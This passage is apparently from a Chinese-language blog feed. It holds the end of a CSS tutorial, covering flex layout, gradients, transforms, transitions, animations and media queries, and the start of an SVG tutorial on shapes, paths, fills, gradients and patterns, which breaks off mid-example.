.box1-footer{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1-container{  flex: 1;  display:flex;  margin: 10px 0;}.box1-aside{  order: -1;  flex: 0 0 50px;  margin-right: 10px;}.box1-right-aside{  order: 1;  flex: 0 0 100px;  margin-left: 10px;}.box1-content{  flex: 1;  -ms-flex: 1;}</style><div class="box1">  <div class="box1-header">header</div>  <div class="box1-container">    <div class="box1-aside">aside</div>    <div class="box1-content">content</div>    <div class="box1-right-aside">right-aside</div>  </div>    <div class="box1-footer">footer</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.app&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  min-height: 100vh;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.header, .footer&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">.container&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.aside, .right-aside&#123;</span><br><span class="line">  flex: 0 0 100px;</span><br><span class="line">&#125;</span><br><span class="line">.content&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;header&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;aside&quot;&gt;aside&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;content&quot;&gt;content&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;right-aside&quot;&gt;right-aside&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;footer&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p>流式布局: 每行的项目数固定，会自动分行</p><style>.parent {  width: 100%;  height: 150px;  background-color: #f6f6f6;  display: flex;  flex-flow: row wrap;  padding: 10px;}.child {  box-sizing: border-box;  background-color: #fff;  flex: 0 0 30%;  height: 50px;  margin: 10px 1.5% 0;}</style><div class="parent">  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 150px;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-flow: row wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.child &#123;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  flex: 0 0 30%;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin: 10px 1.5% 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-渐变"><a href="#5-渐变" class="headerlink" title="5. 渐变"></a>5. 渐变</h3><ul><li><p>线性渐变</p><style>.line1, .line2{  width: 100%;  height: 8px;  margin-top: 20px;}.line1{  background-image:linear-gradient(to right, yellow, green);}.line2{  background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);}</style><div class="line1"></div><div class="line2"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 关键字可使用to top, to top left等</span><br><span class="line">background-image: linear-gradient(to left / 90deg, orange, green);</span><br><span class="line"></span><br><span class="line">// 自定义渐变</span><br><span class="line">background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);</span><br></pre></td></tr></table></figure></li><li><p>径向渐变</p><style>.gradient-block div{  display: inline-block;  width: 100px;  height: 50px;}.block1 {  background-image: radial-gradient(circle, yellow, green)}.block2{  background-image: radial-gradient(circle at top, yellow, green)}.block3{  background-image: radial-gradient(ellipse, yellow, green)}.block4{  background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)}.block5{  background-image: radial-gradient(circle, yellow 10%, green 20%, orange 80%)}.block6{  background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)}</style><div class="gradient-block">  <div class="block1"></div>  <div class="block2"></div>  <div class="block3"></div>  <div class="block4"></div>  <div class="block5"></div>  <div class="block6"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 原形渐变</span><br><span class="line">background-image: radial-gradient(circle, yellow, green)</span><br><span class="line">background-image: radial-gradient(circle at top, yellow, green)</span><br><span class="line"></span><br><span class="line">// 椭圆渐变</span><br><span class="line">background-image: radial-gradient(ellipse, yellow, green)</span><br><span class="line"></span><br><span class="line">// 自定义圆心和半径([minor radius] [major radius] at x y) 可以用百分比</span><br><span class="line">background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)</span><br><span class="line"></span><br><span class="line">// 多色渐变</span><br><span class="line">background-image: radial-gradient(circle, yellow 10%, green 50%, orange 80%)</span><br><span class="line"></span><br><span class="line">// 重复镜像渐变</span><br><span class="line">background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-变形-transform"><a href="#6-变形-transform" class="headerlink" title="6. 变形 transform"></a>6. 变形 transform</h3><p>CSS变形允许动态的控制元素，可以在屏幕周围移动它们，缩小或扩大，旋转，或结合产生复杂的动画效果。一系列的<code>&lt;transform-function&gt;</code>，表示一个或多个变形函数，以空格分开，代表同时对一个元素进行变形的多种属性操作。<br><style>  .transform div{    width: 100px;    height: 50px;    background-color: green;    color: #fff;    display: inline-block;    vertical-align: middle;    text-align: center;    line-height: 50px;  }  .transform1:hover{    transform: scale(1.5) rotate(30deg)  }  .transform2{    transform: rotate(30deg);    transform-origin: 100% 100%;  }</style><div class="transform">  <div class="transform1">hover me</div>  <div class="transform2"></div></div></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">transform: none | &lt;transform-function&gt; &lt;transform-function&gt; ..</span><br><span class="line"></span><br><span class="line">// 基本变形</span><br><span class="line">transform: translate(40px, 40px) scale(1.5) rotate(30deg)</span><br><span class="line"></span><br><span class="line">// 指定中心点</span><br><span class="line">transform-origin: 100% 100%</span><br></pre></td></tr></table></figure><p><br></p><table><thead><tr><th>2D transform函数</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td>translate(10px, 10px)</td><td style="text-align:center">移动元素。扩展函数translateX(), translateY()</td></tr><tr><td>scale(1.5)</td><td style="text-align:center">缩小或放大元素。扩展函数scaleX(), scaleY()</td></tr><tr><td>rotate(10deg)</td><td style="text-align:center">旋转元素</td></tr><tr><td>skew(10deg)</td><td style="text-align:center">让元素倾斜。扩展函数skewX(), skewY()</td></tr><tr><td>matrix()</td><td style="text-align:center">定义矩阵变形，重新定位元素位置</td></tr><tr><td><strong>3D transform函数</strong></td><td style="text-align:center">translate3d(), translate(), scale3d(), scaleZ(), rotate3d(), <br>rotateX(), rotateY(), rotateZ(), perspective(), matrix3d()</td></tr><tr><td><strong>其他属性</strong></td><td style="text-align:center"></td></tr><tr><td>transform-origin</td><td style="text-align:center">指定元素的中心点的位置</td></tr><tr><td>transform-style</td><td style="text-align:center"><code>flat</code>2D平面呈现， <code>preserve-3d</code>3D空间中呈现</td></tr></tbody></table><p><br></p><h3 id="7-过渡-transition"><a href="#7-过渡-transition" class="headerlink" title="7. 过渡 transition"></a>7. 过渡 transition</h3><p>CSS的transition允许CSS的属性值在一定的时间区间内平滑地过渡。<br><style>.transition div{  width: 100px;  height: 100px;  background-color: green;  text-align: center;  color: #fff;  line-height: 100px;  display: inline-block;  vertical-align: middle;}.transition1:hover{  background-color: orange;  border-radius: 50%;  transition: background 0.5s linear 0s, border-radius 0.2s ease-in 0s;}</style><div class="transition">  <div class="transition1">hover me</div></div></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">transition: &lt;transition-property&gt; &lt;transition-duration&gt; </span><br><span class="line">            &lt;transition-timing-function&gt; &lt;transition-delay&gt; , ...</span><br><span class="line"></span><br><span class="line">// 速记: transition: property, duration, animation type, delay</span><br></pre></td></tr></table></figure><p><em><code>transition-property</code></em><br>指定过渡或动态模拟的CSS属性。<br>支持transition过渡功能的CSS属性: background-color, background-position, opacity, border, outline, margin, padding, width, height, min/max-width/height, top/bottom/left/right, color, font-size, font-weight, letter-spacing, line-height, text-indent, text-shadow, vertical-align, word-spacing, z-index, visibility</p><p><em><code>transition-duration</code></em><br>指定完成过渡所需的时间，单位为s或ms(毫秒)。</p><p><em><code>transition-timing-function</code></em><br>指定过渡函数。<br>ease: 默认值，过渡速度由快到慢，逐渐变慢<br>linear: 恒速<br>ease-in: 加速<br>ease-out: 减速<br>ease-in-out: 先加速后减速</p><p><em><code>transition-delay</code></em><br>指定过渡开始出现的延迟时间，单位为s或ms(毫秒)。</p><p><br></p><h3 id="8-动画-keyframes"><a href="#8-动画-keyframes" class="headerlink" title="8. 动画 @keyframes"></a>8. 动画 @keyframes</h3><style>@keyframes wobble{  0%{ margin-left: 100px; background: green; }  40%{ margin-left: 150px; background: orange; }  60%{ margin-left: 75px; background: blue; }  100%{ margin-left: 100px; background: red; }}.animation{  width: 100px;  height: 100px;  animation: wobble 2s ease-in 0s infinite;}</style><div class="animation"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@keyframes wobble&#123;</span><br><span class="line">  0%&#123; margin-left: 100px; background: green; &#125;</span><br><span class="line">  40%&#123; margin-left: 150px; background: orange; &#125;</span><br><span class="line">  60%&#123; margin-left: 75px; background: blue; &#125;</span><br><span class="line">  100%&#123; margin-left: 100px; background: red; &#125;</span><br><span class="line">&#125;</span><br><span class="line">.animation&#123;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  animation: wobble 2s ease-in 0s infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简写规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">animation: &lt;animation-name&gt; &lt;animation-duration&gt;</span><br><span class="line">           &lt;animation-timing-function&gt; &lt;animation-delay&gt;</span><br><span class="line">           &lt;animation-iteration-count&gt; &lt;animation-direction&gt;</span><br><span class="line">           &lt;animation-play-state&gt; &lt;animation-fill-mode&gt;, ...</span><br></pre></td></tr></table></figure></p><p><em><code>@keyframes</code></em><br>关键帧， 由@keyframes开头，后面紧跟动画的名称，加上一对花括号，里面的样式规则由多个百分比构成，每个百分比中是不同的CSS样式。</p><p><em><code>animation-name</code></em><br>指定一个关键帧动画的名字，这个动画名必须对应一个@keyframes规则</p><p><em><code>animation-duration</code></em><br>设置动画播放所需时间，也就是完成从0%~100%一次动画所需时间。单位为s</p><p><em><code>animation-timing-function</code></em><br>设置动画的播放方式，变换方式ease, ease-in, ease-in-out, ease-out, linear, cubic-bezier。</p><p><em><code>animation-delay</code></em><br>指定动画开始时间，单位为s</p><p><em><code>animation-iteration-count</code></em><br>指定动画播放的循环次数。 <code>infinite | &lt;integer&gt;</code></p><p><em><code>animation-direction</code></em><br>指定动画的播放方向, normal为向前播放，alternate为反方向播放</p><p><em><code>animation-play-state</code></em><br>控制动画的播放状态, paused将正在播放的动画停下来， runing将暂停的动画重新播放</p><p><em><code>animation-fill-mode</code></em><br>定义动画开始前和结束后发生的操作。none按预期进行和结束，动画完成其最后一帧时，动画会翻转到初始帧处。 forwards 动画结束后继续应用最后帧的位置。 backwards 在向元素应用动画样式时迅速应用动画的初始帧。 both元素动画同时具有forwards和backwards的效果。</p><p><br></p><h3 id="9-媒体查询"><a href="#9-媒体查询" class="headerlink" title="9. 媒体查询"></a>9. 媒体查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@media screen and (max-width:600px)&#123;&#125;</span><br><span class="line">@media screen and (min-width:600px) and (max-width:900px)&#123;&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="10-meta标签"><a href="#10-meta标签" class="headerlink" title="10. meta标签"></a>10. meta标签</h3><p>当responsive页面在手机测试的时候，会发现媒体查询都不会生效——页面仍展示位普通样式，只是全局缩小了。 这时需要添加<code>meta</code>标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">MDN - CSS层叠样式表</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a></li><li>《图解CSS3·核心技术与案例实践》 大漠[著]</li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SVG文档</title>
      <link href="/2018/10/06/SVG%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/SVG%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>SVG文档由<code>&lt;svg&gt;</code>根元素和基本形状元素(用于定义圆形、矩形、简单或复杂的曲线)构成。还有一个<code>&lt;g&gt;</code>元素，用来把若干基本形状编成一个组。SVG支持渐变、旋转、滤镜效果、JS接口等功能。<br><br></p><h3 id="1-基本属性"><a href="#1-基本属性" class="headerlink" title="1. 基本属性"></a>1. 基本属性</h3><ul><li><code>version 和 baseProfile</code> : 用于确定SVG版本,是必不可少的。</li><li><code>&lt;object&gt;</code> : 可以通过该元素引用SVG文件</li><li><code>viewBox</code>: 定义画布上可以显示的区域，从(0, 0)点开始， 100宽*100高的区域。这100的区域，会放到200*200的画布上显示，形成了放大两倍的效果。</li><li>SVG里的属性值必须用引号引起来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot;</span><br><span class="line">     baseProfile=&quot;full&quot;</span><br><span class="line">     width=&quot;300&quot; height=&quot;200&quot;</span><br><span class="line">     viewBox=&quot;0 0 100 100&quot;</span><br><span class="line">     xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;object data=&quot;image.svg&quot; type=&quot;image/svg+xml&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-基本形状"><a href="#2-基本形状" class="headerlink" title="2. 基本形状"></a>2. 基本形状</h3><ul><li><p>矩形<br>(x,y) 矩形左上角的位置， width height宽高， rx ry圆角的半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;30&quot; height=&quot;30&quot; rx=&quot;10&quot; ry=&quot;10&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>圆形<br>(cx, cy) 圆心的位置， r 圆的半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;25&quot; cy=&quot;75&quot; r=&quot;20&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>椭圆<br>(cx, cy) 椭圆中心的位置, rx ry 椭圆的x,y半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ellipse cx=&quot;75&quot; cy=&quot;75&quot; rx=&quot;20&quot; ry=&quot;5&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>直线<br>(x1, y1) 起点的位置， (x2, y2) 终点的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;line x1=&quot;10&quot; x2=&quot;50&quot; y1=&quot;110&quot; y2=&quot;150&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>折线<br>points=”x1 y1, x2 y2, x3 y3” 点集数列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;60 110, 65 120, 70 115, 75 130, 80 125, 85 140, 90 135, 95 150, 100 145&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>多边形<br>points=”x1 y1, x2 y2, x3 y3” 点集数列，路径最后一个点自动回到第一个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polygon points=&quot;50 160, 55 180, 70 180, 60 190, 65 205, 50 195, 35 205, 40 190, 30 180, 45 180&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-路径"><a href="#3-路径" class="headerlink" title="3. 路径"></a>3. 路径</h3><p><em>d</em>: 命令+参数的序列，关于如何绘制路径的信息。<strong>命令方式</strong> : 一种用大写字母，表示采用绝对定位。另一种用小写字母，表示采用相对定位。</p><h4 id="3-1-直线命令"><a href="#3-1-直线命令" class="headerlink" title="3.1 直线命令"></a>3.1 直线命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 H 90 V 90 H 10 Z&quot; fill=&quot;transparent&quot; stroke=&quot;black&quot;/&gt;</span><br><span class="line">// M x y  : move to 移动画笔</span><br><span class="line">// L x y  : line to 画一条线段</span><br><span class="line">// H x    : 简写命令，绘制平行线</span><br><span class="line">// V y    : 简写命令，绘制垂直线 </span><br><span class="line">// Z      : 闭合路径</span><br></pre></td></tr></table></figure><h4 id="3-2-曲线命令"><a href="#3-2-曲线命令" class="headerlink" title="3.2 曲线命令"></a>3.2 曲线命令</h4><h5 id="3-2-1-三次贝塞尔曲线"><a href="#3-2-1-三次贝塞尔曲线" class="headerlink" title="3.2.1 三次贝塞尔曲线"></a>3.2.1 三次贝塞尔曲线</h5><p>如果S命令跟在一个C命令或者另一个S命令的后面，它的第一个控制点，就会被假设成前一个控制点的对称点。如果S命令单独使用，前面没有C命令或者另一个S命令，那么它的两个控制点就会被假设为同一个点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 C 20 20, 40 20, 50 10&quot; stroke=&quot;black&quot; fill=&quot;transparent&quot;/&gt;</span><br><span class="line">// C x1 y1, x2 y2, x y | (x1,y1)起点的控制点， (x2,y2)终点的控制点， (x,y)曲线的终点</span><br><span class="line">// S x2 y2, x y        | 简写</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/SVG文档/1.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-2-二次贝塞尔曲线"><a href="#3-2-2-二次贝塞尔曲线" class="headerlink" title="3.2.2 二次贝塞尔曲线"></a>3.2.2 二次贝塞尔曲线</h5><p>T命令前面必须是一个Q命令，或者是另一个T命令，控制点为前一个控制点的对称点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Q x1 y1, x y        | (x1,y1)控制点， (x,y)终点</span><br><span class="line">// T x  y              | 简写</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/SVG文档/2.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-3-弧形"><a href="#3-2-3-弧形" class="headerlink" title="3.2.3 弧形"></a>3.2.3 弧形</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// A rx ry x-axis-rotation large-arc-flag sweep-flag x y</span><br><span class="line">// A x轴半径 y轴半径 x轴旋转角度 角度大小 弧线方向 弧形的终点(x,y) </span><br><span class="line">// a rx ry x-axis-rotation large-arc-flag sweep-flag dx dy</span><br><span class="line">&lt;svg width=&quot;325px&quot; height=&quot;325px&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;path d=&quot;M80 80</span><br><span class="line">           A 45 45, 0, 0, 0, 125 125</span><br><span class="line">           L 125 80 Z&quot; fill=&quot;green&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 80</span><br><span class="line">           A 45 45, 0, 1, 0, 275 125</span><br><span class="line">           L 275 80 Z&quot; fill=&quot;red&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M80 230</span><br><span class="line">           A 45 45, 0, 0, 1, 125 275</span><br><span class="line">           L 125 230 Z&quot; fill=&quot;purple&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 230</span><br><span class="line">           A 45 45, 0, 1, 1, 275 275</span><br><span class="line">           L 275 230 Z&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/SVG文档/3.png" style="max-width: 380px"><br><br></p><h3 id="4-填充与边框"><a href="#4-填充与边框" class="headerlink" title="4. 填充与边框"></a>4. 填充与边框</h3><ul><li><p>上色 : stroke, fill, stroke-opacity, fill-opacity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; stroke=&quot;blue&quot; fill=&quot;purple&quot;</span><br><span class="line">      fill-opacity=&quot;0.5&quot; stroke-opacity=&quot;0.8&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// 使用CSS设置fill和stroke</span><br><span class="line">&lt;rect x=&quot;10&quot; height=&quot;180&quot; y=&quot;10&quot; width=&quot;180&quot; style=&quot;stroke: black; fill: red;&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>描边 : stroke-width, stroke-linecap = “butt/square/round”, stroke-linejoin = “miter/round/bevel”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;40 60 80 20 120 60&quot; stroke=&quot;black&quot; stroke-width=&quot;20&quot;</span><br><span class="line">      stroke-linecap=&quot;butt&quot; fill=&quot;none&quot; stroke-linejoin=&quot;miter&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>虚线 : stroke-dasharray 数列用来描述虚线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M 10 75 Q 50 10 100 75 T 190 75&quot; stroke=&quot;black&quot;</span><br><span class="line">    stroke-linecap=&quot;round&quot; stroke-dasharray=&quot;5,10,5&quot; fill=&quot;none&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-渐变与图案"><a href="#5-渐变与图案" class="headerlink" title="5. 渐变与图案"></a>5. 渐变与图案</h3><ul><li><p>线性渐变<br>在SVG文件的<code>&lt;defs&gt;</code>元素内部，创建一个<code>&lt;linearGradient&gt;</code>节点。<code>&lt;linearGradient&gt;</code>中的(x1,y1) (x2,y2) 定义了渐变路线走向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;100&quot; height=&quot;100&quot; version=&quot;1.1&quot; xmlns=&quot;https://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;defs&gt;</span><br><span class="line">      &lt;linearGradient id=&quot;Gradient1&quot; x1=&quot;0&quot; x2=&quot;0&quot; y1=&quot;0&quot; y2=&quot;1&quot;&gt;</span><br><span class="line">         &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">         &lt;stop offset=&quot;50%&quot; stop-color=&quot;black&quot; stop-opacity=&quot;0.1&quot; /&gt;</span><br><span class="line">         &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">      &lt;/linearGradient&gt;</span><br><span class="line">  &lt;/defs&gt;</span><br><span class="line">  &lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; fill=&quot;url(#Gradient1)&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>径向渐变<br>从一个点开始发散绘制渐变。<br><em>spreadMethod</em> : 当渐变到达终点，但此时尚未被填充完。可以设置spreadMethod, <strong>pad</strong>最终的偏移颜色被用于填充对象剩下的空间。 <strong>reflect</strong>让渐变一直持续下去，但效果与渐变本身相反。 <strong>repeat</strong>跳回最初的颜色然后继续渐变。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">   &lt;radialGradient id=&quot;RadialGradient1&quot; cx=&quot;0.5&quot; cy=&quot;0.5&quot; r=&quot;0.25&quot; fx=&quot;0.25&quot; fy=&quot;0.25&quot; spreadMethod=&quot;repeat&quot;&gt;</span><br><span class="line">      &lt;stop offset=&quot;0%&quot; stop-color=&quot;red&quot; /&gt;</span><br><span class="line">      &lt;stop offset=&quot;100%&quot; stop-color=&quot;blue&quot; /&gt;</span><br><span class="line">   &lt;/radialGradient&gt;</span><br><span class="line">&lt;/defs&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>图案<br><em><code>&lt;pattern&gt;</code></em> 需要放在SVG文档的defs内部。pattern定义了一个单元系统，在pattern元素内你可以包含任何基本形状。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;defs&gt;</span><br><span class="line">  &lt;pattern id=&quot;Pattern&quot; x=&quot;0&quot; y=&quot;0&quot; width=&quot;0.25&quot; height=&quot;0.25&quot;&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;50&quot; height=&quot;50&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; 